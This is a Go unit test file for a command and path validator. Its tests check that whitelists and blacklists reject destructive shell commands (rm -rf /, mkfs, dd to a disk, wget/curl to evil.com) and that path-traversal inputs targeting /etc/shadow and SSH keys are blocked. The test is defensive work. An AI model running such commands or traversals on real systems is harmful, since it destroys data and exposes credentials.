package security

import (
	"strings"
	"testing"
)

func TestWhitelistAllowsListedCommands(t *testing.T) {
	v := New("whitelist", []string{"ls", "cat", "echo", "grep"}, nil, nil, nil)

	tests := []struct {
		command string
		allowed bool
	}{
		{"ls -la", true},
		{"cat /etc/hosts", true},
		{"echo hello world", true},
		{"grep -r pattern .", true},
	}

	for _, tt := range tests {
		err := v.ValidateCommand(tt.command)
		if tt.allowed && err != nil {
			t.Errorf("ValidateCommand(%q) = %v, want nil", tt.command, err)
		}
	}
}

func TestWhitelistRejectsUnlistedCommands(t *testing.T) {
	v := New("whitelist", []string{"ls", "cat", "echo"}, nil, nil, nil)

	tests := []string{
		"rm -rf /",
		"wget http://evil.com",
		"curl http://evil.com",
		"sudo su",
	}

	for _, cmd := range tests {
		err := v.ValidateCommand(cmd)
		if err == nil {
			t.Errorf("ValidateCommand(%q) = nil, want error", cmd)
		}
		if !strings.Contains(err.Error(), "not in the whitelist") {
			t.Errorf("error = %q, expected to contain 'not in the whitelist'", err.Error())
		}
	}
}

func TestBlacklistAllowsMostCommands(t *testing.T) {
	v := New("blacklist", nil, []string{"rm -rf /", "mkfs", "dd if=/dev/zero"}, nil, nil)

	tests := []string{
		"ls -la",
		"echo hello",
		"cat /etc/hosts",
		"ps aux",
		"rm file.txt", // "rm" alone is fine, only "rm -rf /" is blocked
	}

	for _, cmd := range tests {
		err := v.ValidateCommand(cmd)
		if err != nil {
			t.Errorf("ValidateCommand(%q) = %v, want nil", cmd, err)
		}
	}
}

func TestBlacklistRejectsBlockedPatterns(t *testing.T) {
	v := New("blacklist", nil, []string{"rm -rf /", "mkfs", "dd if=/dev/zero", "chmod -R 777 /"}, nil, nil)

	tests := []struct {
		command string
		pattern string
	}{
		{"rm -rf /", "rm -rf /"},
		{"sudo rm -rf / --no-preserve-root", "rm -rf /"},
		{"mkfs.ext4 /dev/sda1", "mkfs"},
		{"dd if=/dev/zero of=/dev/sda", "dd if=/dev/zero"},
		{"chmod -R 777 /", "chmod -R 777 /"},
	}

	for _, tt := range tests {
		err := v.ValidateCommand(tt.command)
		if err == nil {
			t.Errorf("ValidateCommand(%q) = nil, want error", tt.command)
		}
		if err != nil && !strings.Contains(err.Error(), "blocked pattern") {
			t.Errorf("error = %q, expected to contain 'blocked pattern'", err.Error())
		}
	}
}

func TestValidateUploadPathAllowed(t *testing.T) {
	v := New("blacklist", nil, nil, []string{"/tmp/uploads", "/home/user/uploads"}, nil)

	tests := []string{
		"/tmp/uploads/file.txt",
		"/tmp/uploads/subdir/file.txt",
		"/home/user/uploads/data.bin",
	}

	for _, path := range tests {
		err := v.ValidateUploadPath(path)
		if err != nil {
			t.Errorf("ValidateUploadPath(%q) = %v, want nil", path, err)
		}
	}
}

func TestValidateUploadPathRejected(t *testing.T) {
	v := New("blacklist", nil, nil, []string{"/tmp/uploads"}, nil)

	tests := []string{
		"/etc/passwd",
		"/home/user/file.txt",
		"/var/log/syslog",
	}

	for _, path := range tests {
		err := v.ValidateUploadPath(path)
		if err == nil {
			t.Errorf("ValidateUploadPath(%q) = nil, want error", path)
		}
	}
}

func TestValidateDownloadPathAllowed(t *testing.T) {
	v := New("blacklist", nil, nil, nil, []string{"/home/user", "/var/log"})

	tests := []string{
		"/home/user/document.pdf",
		"/home/user/subdir/file.txt",
		"/var/log/syslog",
	}

	for _, path := range tests {
		err := v.ValidateDownloadPath(path)
		if err != nil {
			t.Errorf("ValidateDownloadPath(%q) = %v, want nil", path, err)
		}
	}
}

func TestValidateDownloadPathRejected(t *testing.T) {
	v := New("blacklist", nil, nil, nil, []string{"/home/user"})

	tests := []string{
		"/etc/shadow",
		"/root/.ssh/id_rsa",
		"/tmp/secret.txt",
	}

	for _, path := range tests {
		err := v.ValidateDownloadPath(path)
		if err == nil {
			t.Errorf("ValidateDownloadPath(%q) = nil, want error", path)
		}
	}
}

func TestPathTraversalAttacks(t *testing.T) {
	v := New("blacklist", nil, nil, []string{"/tmp/uploads"}, []string{"/home/user"})

	uploadTraversals := []string{
		"/tmp/uploads/../../etc/passwd",
		"/tmp/uploads/../../../etc/shadow",
		"/tmp/uploads/./../../root/.ssh/id_rsa",
	}

	for _, path := range uploadTraversals {
		err := v.ValidateUploadPath(path)
		if err == nil {
			t.Errorf("ValidateUploadPath(%q) = nil, want error (path traversal)", path)
		}
	}

	downloadTraversals := []string{
		"/home/user/../../etc/passwd",
		"/home/user/../../../etc/shadow",
		"/home/user/./../../root/.ssh/id_rsa",
	}

	for _, path := range downloadTraversals {
		err := v.ValidateDownloadPath(path)
		if err == nil {
			t.Errorf("ValidateDownloadPath(%q) = nil, want error (path traversal)", path)
		}
	}
}

func TestEmptyCommand(t *testing.T) {
	v := New("whitelist", []string{"ls"}, nil, nil, nil)
	err := v.ValidateCommand("")
	if err == nil {
		t.Error("ValidateCommand('') = nil, want error")
	}
}

func TestNoUploadDirsConfigured(t *testing.T) {
	v := New("blacklist", nil, nil, nil, nil)
	err := v.ValidateUploadPath("/tmp/file.txt")
	if err == nil {
		t.Error("ValidateUploadPath with no dirs configured = nil, want error")
	}
}

func TestNoDownloadDirsConfigured(t *testing.T) {
	v := New("blacklist", nil, nil, nil, nil)
	err := v.ValidateDownloadPath("/tmp/file.txt")
	if err == nil {
		t.Error("ValidateDownloadPath with no dirs configured = nil, want error")
	}
}
